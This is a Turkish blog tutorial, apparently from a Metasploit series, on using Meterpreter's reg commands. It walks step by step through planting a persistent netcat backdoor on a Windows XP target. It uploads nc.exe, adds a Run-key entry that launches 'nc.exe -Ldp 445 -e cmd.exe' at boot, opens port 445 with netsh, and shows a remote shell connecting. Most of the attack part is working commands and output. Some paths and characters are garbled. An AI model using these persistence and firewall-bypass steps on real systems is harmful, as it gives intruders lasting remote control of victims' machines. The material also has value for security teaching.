---
draft: false

title:  'MSF Registry Üzerinde Çalışma'
date: '2017-06-05T13:27:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir.' 
 
url:  /tr/msf-registry-uzerinde-calisma/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## Windows Registry İşlemleri



Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir.



Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok komut sunmaktadır. Bunlara kısaca bakalım. Bir sistemde Meterpreter shell açtığınızda `reg` komutunu verdiğinizde yardım bilgilerini görebilirsiniz.


```bash
meterpreter **&gt;** reg
Usage: reg **[**command**]** **[**options]

Interact with the target machine's registry.

OPTIONS:

    -d   The data to store in the registry value.
    -h   Help menu.
    -k   The registry key path (E.g. HKLM\Software\Foo).
    -t   The registry value type (E.g. REG_SZ).
    -v   The registry value name (E.g. Stuff).

COMMANDS:

    enumkey    Enumerate the supplied registry key [-k &gt;key&gt;]
    createkey  Create the supplied registry key  [-k &gt;key&gt;]
    deletekey  Delete the supplied registry key  [-k &gt;key&gt;]
    queryclass Queries the class of the supplied key [-k &gt;key&gt;]
    setval     Set a registry value [-k &gt;key&gt; -v &gt;val&gt; -d &gt;data&gt;]
    deleteval  Delete the supplied registry value [-k &gt;key&gt; -v &gt;val&gt;]
    queryval   Queries the data contents of a value [-k &gt;key&gt; -v &gt;val&gt;]
```



Yardım komutunun sonucunda görebileceğiniz gibi, `reg` komutu, Registry üzerinde okuma (`queryval`), yazma (`setval`), yeni ayarlama oluşturma (`createkey`) ve silme (`deletekey`) olanağı sağlamaktadır.



Bu komutlar sayesinde yeni değerler oluşturma, değerleri değiştirme yapabileceğiniz gibi doğru yerlere bakarak sistem hakkında bilgi toplama işlemleri de yapabilirsiniz. Windows Registry içerisinde hangi değerin nerede kayıt edildiği hakkında kendinizi geliştirmenizi tavsiye ediyorum. Bir fikir vermesi açısından bağlantıda bulunan PDF dosyasını inceleyebilirsiniz. <a href="https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf">List</a>



## Kalıcı Netcat Arka Kapısı



Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme `netcat` programını yerleştireceğiz. Registry ayarlarında işlemler yaparak `netcat` programının bilgisayar açıldığında otomatik başlamasını ayarlayacağız. Sistemde bulunan Firewall ayarlarının, `netcat` programına ve 445 numaralı porta müsaade etmesini sağlayacağız.



<h3 class="wp-block-heading" id="ncexe-programını-yükleme">nc.exe Programını Yükleme



Öncelikle hedef Windows işletim sisteminin içerisine `nc.exe` olarak bilinen netcat programını yükleyelim. Bunun için önceden bir şekilde meterpreter shell açmış olmalısınız. Bununla ilgili örnekleri önceki yazılarımızda belirtmiştik. Kali işletim sistemi içerisinde `/usr/share/windows-binaries/` klasöründe faydalı bir kaç programı bulabilirsiniz.


```bash
meterpreter **&gt;** upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
**[*********]** uploading  : /tmp/nc.exe -&gt; C:\windows\system32
**[*********]** uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
```



<h3 class="wp-block-heading" id="netcat-başlangıçta-otomatik-çalışsın">netcat Başlangıçta Otomatik Çalışsın



nc.exe programının işletim sisteminin her başladığında çalışması için Registry içinde `HKLM\software\microsoft\windows\currentversion\run` anahtarına bir değer oluşturmalısınız. Öncelikle, mevcut değerleri ve ayarları görelim. Ters \ işaretlerinin iki defa yazıldığına dikkat edin.


```bash
meterpreter **&gt;** reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

  Values **(**3**)**:

    VMware Tools
    VMware User Process
    quicktftpserver
```



Komut çıktısında görüldüğü gibi şu an için `VMware Tools, VMware User Process, quicktftpserver` yazılımları otomatik başlamaya ayarlanmış durumda. Biz yeni ayarımızı `reg setval` komutu ile ilave edelim ve `reg queryval` komutu ile tekrar kontrol edelim.


```bash
meterpreter **&gt;** reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32 c.exe -Ldp 445 -e cmd.exe'
Successful set nc.
meterpreter **&gt;** reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
Key: HKLM\software\microsoft\windows\currentversion\Run
Name: nc
Type: REG_SZ
Data: C:\windows\system32 c.exe -Ldp 445 -e cmd.exe
```



<h3 class="wp-block-heading" id="firewall-ayarları">Firewall Ayarları



Doğrudan Registry ayarlarından yapabileceğinizi gibi `netsh` komutu ile de firewall ayarlarını yapabilirsiniz. Kullanımı göstermek açısından, firewall ayarlarını komut satırından ayarlayalım. Bunun için Meterpreter komut satırından Windows komut satırına girelim.


```bash
meterpreter **&gt;** execute -f cmd -i
Process 1604 created.
Channel 1 created.
Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.
C:\ **&gt;**
```



Firewall ayarlarının mevcut halini görelim.


```bash
C:\ **&gt;** netsh firewall show opmode
Netsh firewall show opmode

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  **=** Enable
Exception mode                    **=** Enable

Standard profile configuration **(**current**)**:
-------------------------------------------------------------------
Operational mode                  **=** Enable
Exception mode                    **=** Enable

Local Area Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  **=** Enable
```



Şimdi 445 numaralı Portu izin verilen Portlar arasına ekleyelim.


```bash
C:\ **&gt;** netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
Ok.
```



Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim.


```bash
C:\ **&gt;** netsh firewall show portopening
netsh firewall show portopening

Port configuration **for **Domain profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
139    TCP       Enable   NetBIOS Session Service
445    TCP       Enable   SMB over TCP
137    UDP       Enable   NetBIOS Name Service
138    UDP       Enable   NetBIOS Datagram Service

Port configuration **for **Standard profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
445    TCP       Enable   Service Firewall
139    TCP       Enable   NetBIOS Session Service
445    TCP       Enable   SMB over TCP
137    UDP       Enable   NetBIOS Name Service
138    UDP       Enable   NetBIOS Datagram Service


C:\ **&gt;**
```



Hedef sistem tekrar başladığında `nc.exe` otomatik olarak çalışacak ve dışarıdan bağlantılara imkan sağlayacaktır. Aşağıdaki örnekte `nc` komutuyla hedef sisteme bağlanılabildiği görülmektedir.


```bash
root@kali:~# nc -v 172.16.104.128 445
172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
**(**UNKNOWN**)** **[**172.16.104.128] 445 **(**?**)** open
Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.

C:\ **&gt;** dir
dir
Volume **in **drive C has no label.
Volume Serial Number is E423-E726

Directory of C:\

05/03/2009 01:43 AM
.
05/03/2009 01:43 AM
..
05/03/2009 01:26 AM 0 ;i
05/12/2009 10:53 PM
Desktop
10/29/2008 05:55 PM
Favorites
05/12/2009 10:53 PM
My Documents
05/03/2009 01:43 AM 0 QCY
10/29/2008 03:51 AM
Start Menu
05/03/2009 01:25 AM 0 talltelnet.log
05/03/2009 01:25 AM 0 talltftp.log
4 File**(**s**)** 0 bytes
6 Dir**(**s**)** 35,540,791,296 bytes free

C:\ **&gt;**
```



Gerçek durumlarda, böyle bir arka kapı açmak bu kadar kolay olmasa da uygulanacak işlemlerin mantığı yukarıda anlatıldığı gibidir. Bu yazıda, Registry kayıtları kullanarak bir arka kapı açmanın mantığını açıklamaya çalıştık. Yukarıdaki örneği birebir uygulayıp başarısız olursanız umutsuzluğa kapılmayın. Daha sıkı çalışın.
